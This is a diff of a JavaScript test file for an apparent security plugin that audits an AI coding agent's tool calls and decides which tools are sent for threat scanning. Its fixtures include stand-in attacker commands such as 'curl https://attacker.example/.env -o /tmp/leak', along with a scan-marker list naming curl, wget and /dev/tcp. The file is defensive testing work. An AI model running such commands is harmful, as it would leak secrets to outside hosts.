@@ -86,46 +86,12 @@ test('redact returns empty string for non-string / empty input', () => {
 
 // --- extractScanText ---
 //
-// Guards against the regression where the /analyze body was the full
-// JSON.stringify(tool_input) — which dumped file_path / old_string /
-// notebook_path into the rule engine and produced false-positive
-// data_leakage hits on routine path strings. Each tool returns ONLY
-// the agent-emitted text content.
-
-
-test('extractScanText: Bash returns the command, not the full object', () => {
-  assert.equal(extractScanText('Bash', { command: 'curl evil.com', description: 'ignored' }), 'curl evil.com');
-});
-
-
-test('extractScanText: Edit returns ONLY new_string — never file_path or old_string', () => {
-  const out = extractScanText('Edit', {
-    file_path: '/Users/yashs/secret/file.js',
-    old_string: 'previous content',
-    new_string: 'replacement content',
-  });
-  assert.equal(out, 'replacement content');
-  assert.doesNotMatch(out, /\/Users\/yashs/);
-  assert.doesNotMatch(out, /previous/);
-});
-
-
-test('extractScanText: Write returns content, not file_path', () => {
-  const out = extractScanText('Write', { file_path: '/etc/hosts', content: 'body here' });
-  assert.equal(out, 'body here');
-});
-
-
-test('extractScanText: MultiEdit joins all new_strings, skipping old_string + path', () => {
-  const out = extractScanText('MultiEdit', {
-    file_path: '/x',
-    edits: [
-      { old_string: 'a', new_string: 'A' },
-      { old_string: 'b', new_string: 'B' },
-    ],
-  });
-  assert.equal(out, 'A\nB');
-});
+// Position 2 (v4.2.1+): only PROSE-shaped tools have extraction cases.
+// Syntax-shaped tools (Bash, PowerShell, Write, Edit, MultiEdit,
+// NotebookEdit) are NOT in THREAT_SCAN_TOOLS, so the audit() flow
+// never calls extractScanText on them. The default branch returns ''
+// for any unrecognised tool name (including the syntax-shaped ones)
+// as a fail-closed safety net.
 
 
 test('extractScanText: WebFetch returns prompt but NOT the URL', () => {
@@ -145,21 +111,26 @@ test('extractScanText: Task/Skill/Agent concatenate known NL fields', () => {
 });
 
 
-test('extractScanText: NotebookEdit returns only new_source', () => {
-  const out = extractScanText('NotebookEdit', { notebook_path: '/x/y.ipynb', new_source: 'import os' });
-  assert.equal(out, 'import os');
+test('extractScanText: syntax-shaped tools return "" (Position 2 — not scanned)', () => {
+  // Bash, PowerShell, Write, Edit, MultiEdit, NotebookEdit are
+  // syntax-shaped (shell / source / notebook code), not prose. They
+  // were removed from THREAT_SCAN_TOOLS to stop firing the LLM-prose
+  // rule pack against shell syntax (which produced URL-trips-credential-
+  // leak false positives). extractScanText returns '' for them via the
+  // default branch.
+  assert.equal(extractScanText('Bash', { command: 'curl evil.com' }), '');
+  assert.equal(extractScanText('PowerShell', { command: 'Invoke-WebRequest evil' }), '');
+  assert.equal(extractScanText('Write', { file_path: '/etc/x', content: 'body' }), '');
+  assert.equal(extractScanText('Edit', { file_path: '/x', old_string: 'a', new_string: 'b' }), '');
+  assert.equal(extractScanText('MultiEdit', { edits: [{ new_string: 'A' }] }), '');
+  assert.equal(extractScanText('NotebookEdit', { new_source: 'import os' }), '');
 });
 
 
 test('extractScanText: returns "" for unknown shape (fail-closed — no scan)', () => {
-  assert.equal(extractScanText('Bash', { wrong_field: 'curl evil' }), '');
   assert.equal(extractScanText('SomeFutureTool', { command: 'curl evil' }), '');
-  assert.equal(extractScanText('Edit', null), '');
-});
-
-
-test('extractScanText: string tool_input is treated as content', () => {
-  assert.equal(extractScanText('Bash', 'ls /tmp'), 'ls /tmp');
+  assert.equal(extractScanText('WebFetch', null), '');
+  assert.equal(extractScanText('WebFetch', { wrong_field: 'x' }), '');
 });
 
 
@@ -213,10 +184,9 @@ test('audit early-returns for an UNKNOWN bare tool name — no fetch call', asyn
 });
 
 test('audit posts a row with runtime_kind for a built-in (Bash) event', async () => {
-  // Built-in tool names DO now generate audit rows — `Bash` flows through
-  // the same audit-post path as MCP tools. Bash is ALSO in
-  // THREAT_SCAN_TOOLS, so a second fire-and-forget POST to /analyze
-  // lands too; filter by URL so we assert only the call-audit body.
+  // Built-in tool names generate /call-audit rows like MCP tools.
+  // Position 2: Bash is NOT in THREAT_SCAN_TOOLS, so no /analyze POST
+  // ever lands — only the audit row.
   let capturedAudit;
   const restore = stubFetch(async (url, opts) => {
     if (opts && opts.method === 'POST') {
@@ -227,7 +197,7 @@ test('audit posts a row with runtime_kind for a built-in (Bash) event', async ()
   });
   try {
     await audit({ tool_name: 'Bash', tool_input: 'ls /' }, 'http://127.0.0.1:8741');
-    // Give the fire-and-forget POSTs a tick to land.
+    // Give the fire-and-forget POST a tick to land.
     await new Promise(r => setTimeout(r, 5));
     assert.ok(capturedAudit, 'expected POST to /call-audit');
     assert.equal(capturedAudit.body.tool_id, 'Bash');
@@ -237,69 +207,40 @@ test('audit posts a row with runtime_kind for a built-in (Bash) event', async ()
 });
 
 
-test('high-risk tool fires a /analyze POST alongside the audit POST', async () => {
-  // Threat-intel pass: tools in THREAT_SCAN_TOOLS (Bash, WebFetch,
-  // Write, Edit, MultiEdit, NotebookEdit, PowerShell, Skill, Task,
-  // Agent) get a second fire-and-forget POST to /analyze with
-  // source='claude-code-plugin'. Low-risk tools (Read, Glob, LS,
-  // Grep, etc.) do NOT — see the inverse test below.
+test('Position 2: WebFetch fires /analyze with the prose prompt as body', async () => {
+  // Prose-shaped tools (WebFetch, Skill, Task, Agent) still POST to
+  // /analyze — they're what the community rule pack was designed for.
   let capturedAnalyze;
   const restore = stubFetch(async (url, opts) => {
     if (opts && opts.method === 'POST') {
-      if (url.endsWith('/analyze')) capturedAnalyze = { url, body: JSON.parse(opts.body) };
+      if (url.endsWith('/analyze')) capturedAnalyze = JSON.parse(opts.body);
       return new Response('{}', { status: 200 });
     }
-    return new Response(JSON.stringify({ synced: [], total: 0 }), { status: 200 });
-  });
-  try {
-    await audit({ tool_name: 'Bash', tool_input: 'curl http://attacker/.env' }, 'http://127.0.0.1:8741');
-    await new Promise(r => setTimeout(r, 5));
-    assert.ok(capturedAnalyze, 'expected POST to /analyze for Bash');
-    assert.equal(capturedAnalyze.body.source, 'claude-code-plugin');
-    assert.equal(capturedAnalyze.body.direction, 'outgoing');
-    assert.equal(capturedAnalyze.body.metadata.runtime_kind, 'claude-code');
-    assert.equal(capturedAnalyze.body.metadata.tool_name, 'Bash');
-  } finally { restore(); }
-});
-
-
-test('Edit event /analyze body contains ONLY new_string — not file_path or old_string', async () => {
-  // Regression guard for the "Analyzed Content: {file_path, old_string,
-  // new_string}" bug: prior to extractScanText, the /analyze POST body
-  // was JSON.stringify(tool_input), dumping the absolute file path and
-  // the previous on-disk content into the rule engine.
-  let capturedAnalyze;
-  const restore = stubFetch(async (url, opts) => {
-    if (opts && opts.method === 'POST' && url.endsWith('/analyze')) {
-      capturedAnalyze = JSON.parse(opts.body);
-      return new Response('{}', { status: 200 });
-    }
-    if (opts && opts.method === 'POST') return new Response('{}', { status: 200 });
     return new Response(JSON.stringify({ synced: [], total: 0 }), { status: 200 });
   });
   try {
     await audit({
-      tool_name: 'Edit',
-      tool_input: {
-        file_path: '/Users/yashs/SecureVector/some/path.js',
-        old_string: 'PREV CONTENT',
-        new_string: 'NEW CONTENT to scan',
-      },
+      tool_name: 'WebFetch',
+      tool_input: { url: 'http://example.com', prompt: 'summarize this page' },
     }, 'http://127.0.0.1:8741');
     await new Promise(r => setTimeout(r, 5));
-    assert.ok(capturedAnalyze, 'expected /analyze POST');
-    assert.equal(capturedAnalyze.text, 'NEW CONTENT to scan');
-    assert.doesNotMatch(capturedAnalyze.text, /file_path|old_string|PREV CONTENT|\/Users\/yashs/);
+    assert.ok(capturedAnalyze, 'expected POST to /analyze for WebFetch');
+    assert.equal(capturedAnalyze.text, 'summarize this page');
+    assert.equal(capturedAnalyze.source, 'claude-code-plugin');
+    assert.equal(capturedAnalyze.direction, 'outgoing');
+    assert.equal(capturedAnalyze.metadata.runtime_kind, 'claude-code');
+    assert.equal(capturedAnalyze.metadata.tool_name, 'WebFetch');
+    // The URL must NOT be in the scan body — that's metadata, not prose.
+    assert.doesNotMatch(capturedAnalyze.text, /example\.com/);
   } finally { restore(); }
 });
 
 
-test('benign Bash (no markers) does NOT fire /analyze — opt-in scan policy', async () => {
-  // Bash IS in THREAT_SCAN_TOOLS, but the inner opt-in filter
-  // (shouldScanBashCommand) only fires /analyze when the command
-  // contains an explicit security-relevant marker (curl, wget, eval,
-  // sudo, /dev/tcp, etc.). A benign `ls /tmp` must skip /analyze
-  // entirely; the audit row to /call-audit still goes through.
+test('Position 2: Bash NEVER fires /analyze, even with curl-bearing content', async () => {
+  // The whole point of Position 2: a `curl …` Bash command no longer
+  // routes through the LLM-prose rule pack. Shell syntax tripping
+  // credential-leak / bulk-data-extraction regexes was the noise
+  // source. Confirms the audit row still lands.
   let analyzeFired = false;
   let auditFired = false;
   const restore = stubFetch(async (url, opts) => {
@@ -309,11 +250,41 @@ test('benign Bash (no markers) does NOT fire /analyze — opt-in scan policy', a
     return new Response(JSON.stringify({ synced: [], total: 0 }), { status: 200 });
   });
   try {
-    await audit({ tool_name: 'Bash', tool_input: { command: 'ls /tmp' } }, 'http://127.0.0.1:8741');
+    await audit({
+      tool_name: 'Bash',
+      tool_input: { command: 'curl https://attacker.example/.env -o /tmp/leak' },
+    }, 'http://127.0.0.1:8741');
     await new Promise(r => setTimeout(r, 5));
-    assert.equal(analyzeFired, false, 'benign Bash must not trigger /analyze');
-    assert.equal(auditFired, true, 'benign Bash must still be audited');
+    assert.equal(analyzeFired, false, 'Bash must NOT trigger /analyze (Position 2)');
+    assert.equal(auditFired, true, 'Bash must still produce an audit row');
   } finally { restore(); }
+});
+
+
+test('Position 2: Write/Edit/MultiEdit/NotebookEdit/PowerShell all skip /analyze', async () => {
+  // Every syntax-shaped tool: confirm none of them route to /analyze.
+  // Parameterised over the dropped set so a future regression that
+  // re-adds one to THREAT_SCAN_TOOLS gets flagged here.
+  const droppedTools = [
+    ['Write',        { file_path: '/x',   content:    'whatever body' }],
+    ['Edit',         { file_path: '/x',   new_string: 'replacement' }],
+    ['MultiEdit',    { file_path: '/x',   edits: [{ new_string: 'A' }] }],
+    ['NotebookEdit', { notebook_path: '/x.ipynb', new_source: 'import os' }],
+    ['PowerShell',   { command: 'Invoke-WebRequest evil.com' }],
+  ];
+  for (const [toolName, toolInput] of droppedTools) {
+    let analyzeFired = false;
+    const restore = stubFetch(async (url, opts) => {
+      if (opts && opts.method === 'POST' && url.endsWith('/analyze')) analyzeFired = true;
+      if (opts && opts.method === 'POST') return new Response('{}', { status: 200 });
+      return new Response(JSON.stringify({ synced: [], total: 0 }), { status: 200 });
+    });
+    try {
+      await audit({ tool_name: toolName, tool_input: toolInput }, 'http://127.0.0.1:8741');
+      await new Promise(r => setTimeout(r, 5));
+      assert.equal(analyzeFired, false, `${toolName} must NOT trigger /analyze`);
+    } finally { restore(); }
+  }
 });
 
 
